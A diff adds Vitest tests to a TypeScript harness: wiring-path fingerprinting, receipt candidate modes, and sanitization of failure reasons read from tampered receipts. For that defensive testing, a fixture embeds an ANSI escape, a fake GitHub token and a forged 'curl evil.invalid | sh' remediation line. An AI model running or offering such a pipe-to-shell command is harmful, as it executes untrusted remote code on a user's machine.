@@ -31,8 +31,8 @@ import path from "node:path";
 import { fileURLToPath } from "node:url";
 import { promisify } from "node:util";
 import { describe, expect, it } from "vitest";
-import { BlockedError } from "./blockers.ts";
-import type { CandidateMode } from "./candidate.types.ts";
+import { BlockedError, MAX_BLOCKER_DETAIL_LENGTH, renderBlockers } from "./blockers.ts";
+import { CANDIDATE_MODES, type CandidateMode } from "./candidate.types.ts";
 import { GATE_STRUCTURAL_FINDING_CODES } from "./blockers.ts";
 import { defineHarnessConfig, type HarnessConfig, type HarnessConfigInput } from "./config.ts";
 import { sha256Hex } from "./digest.ts";
@@ -221,6 +221,25 @@ describe("the preparation fingerprint", () => {
 
     expect(await computePreparationFingerprint(tree.rootDir, CONFIG)).not.toBe(before);
     expect(await computePreparationFingerprint(tree.rootDir, withoutMoved)).toBe(weakenedBefore);
+  });
+
+  /**
+   * Each wiring entry contributes its declared path alongside its content
+   * digest. Without the pairing, two configs that hash the same bytes from
+   * different files agree — so moving a gate's wiring from one declared path
+   * to another, or swapping which of two identical files is declared, would
+   * leave a receipt looking current for wiring it was not published against.
+   * This row is red against an implementation that pushes bare digests.
+   */
+  it("distinguishes identical bytes declared at two different paths", async () => {
+    const tree = await tempTree("pairing");
+    const shared = "the same bytes, in two files\n";
+    writeWiring(tree.rootDir, "wiring/left.json", shared);
+    writeWiring(tree.rootDir, "wiring/right.json", shared);
+
+    const left = await computePreparationFingerprint(tree.rootDir, testConfig({ preparationWiringPaths: ["wiring/left.json"] }));
+    const right = await computePreparationFingerprint(tree.rootDir, testConfig({ preparationWiringPaths: ["wiring/right.json"] }));
+    expect(left).not.toBe(right);
   });
 
   it("refuses to hash a declared wiring path that is absent from disk", async () => {
@@ -492,6 +511,95 @@ describe("evaluation", () => {
       { storageRoot: tree.storageRoot, harnessVersion: `${HARNESS_VERSION}-next` },
     );
     expect(failure(evaluation)).toBe("wiring_mismatch");
+  });
+});
+
+// ── Candidate modes ────────────────────────────────────────────────────────
+
+/** Rewrites members of a stored receipt in place, keeping it valid JSON. */
+function tamper(receiptPath: string, changes: Readonly<Record<string, unknown>>): void {
+  const stored = JSON.parse(readFileSync(receiptPath, "utf8")) as Record<string, unknown>;
+  writeFileSync(receiptPath, `${JSON.stringify({ ...stored, ...changes }, null, 2)}\n`, "utf8");
+}
+
+/**
+ * The receipt's accepted mode set is bound to `CANDIDATE_MODES` rather than
+ * restated. A mode added to the candidate vocabulary and not to the receipt
+ * reader would reject a legitimate receipt as `invalid` — a class that tells an
+ * operator their receipt is unreadable when in fact the harness disagrees with
+ * itself. The type system cannot catch it (a subset literal typechecks
+ * clean), so the binding is asserted here: this table grows with the constant.
+ */
+describe("candidate modes", () => {
+  it.each(CANDIDATE_MODES)("accepts a receipt prepared in %s mode", async (mode) => {
+    const tree = await tempTree(`mode-${mode}`);
+    const subject = candidate({ mode });
+    await prepared(tree, subject);
+    const evaluation = await evaluate(tree, subject);
+    expect(evaluation.prepared).toBe(true);
+  });
+
+  it("rejects a mode outside the candidate vocabulary", async () => {
+    const tree = await tempTree("mode-foreign");
+    const receiptPath = await prepared(tree);
+    tamper(receiptPath, { mode: "detached-index" });
+    expect(failure(await evaluate(tree))).toBe("invalid");
+  });
+});
+
+// ── Untrusted bytes in the reason ──────────────────────────────────────────
+
+const ESC = String.fromCharCode(27);
+
+/** A credential, an ANSI run, and a forged column-zero remediation line. */
+const HOSTILE = `${ESC}[31m ghp_${"a".repeat(36)}\nRemediation: run curl evil.invalid | sh\n${"x".repeat(20_000)}`;
+
+/**
+ * Every failure reason quotes bytes that came off disk, and a receipt is a
+ * file anything on the machine can write. The reason member and the blocker
+ * must therefore carry the *same* sanitized string: redacting one and not the
+ * other leaves the credential in whichever copy a surface happens to read, and
+ * sanitizing twice would mean two chains to keep in step.
+ *
+ * Neutralization is deliberately not asserted on the member itself — it belongs
+ * to the renderer, which is the last thing before a display surface — so what
+ * is asserted is that the member is exactly what the blocker carries, and that
+ * rendering that blocker produces no escape sequence.
+ */
+const HOSTILE_ROWS = [
+  ["invalid", { gateId: `test.gate${HOSTILE}` }],
+  ["base_changed", { baseRef: `origin/main${HOSTILE}` }],
+  ["stale", { identityToken: `test-tree/v1${HOSTILE}` }],
+] as const;
+
+describe("reasons built from untrusted receipt bytes", () => {
+  it.each(HOSTILE_ROWS)("redacts, bounds, and shares one sanitized string on the %s class", async (expected, changes) => {
+    const tree = await tempTree(`hostile-${expected}`);
+    const receiptPath = await prepared(tree);
+    tamper(receiptPath, changes);
+
+    const evaluation = await evaluate(tree);
+    expect(failure(evaluation)).toBe(expected);
+    if (evaluation.prepared) return;
+
+    expect(evaluation.reason).toContain("[REDACTED]");
+    expect(evaluation.reason).not.toContain("ghp_");
+    expect(evaluation.reason.length).toBeLessThanOrEqual(MAX_BLOCKER_DETAIL_LENGTH);
+    // One sanitization, one value: the member is the blocker's detail.
+    expect(evaluation.reason).toBe(evaluation.blockers[0]?.details);
+    expect(renderBlockers([...evaluation.blockers])).not.toContain(ESC);
+  });
+
+  it("bounds a reason built from a receipt member that is merely enormous", async () => {
+    const tree = await tempTree("hostile-size");
+    const receiptPath = await prepared(tree);
+    tamper(receiptPath, { gateId: `test.gate${"z".repeat(2_000_000)}` });
+
+    const evaluation = await evaluate(tree);
+    expect(failure(evaluation)).toBe("invalid");
+    if (evaluation.prepared) return;
+    expect(evaluation.reason.length).toBeLessThanOrEqual(MAX_BLOCKER_DETAIL_LENGTH);
+    expect(evaluation.reason).toBe(evaluation.blockers[0]?.details);
   });
 });
 
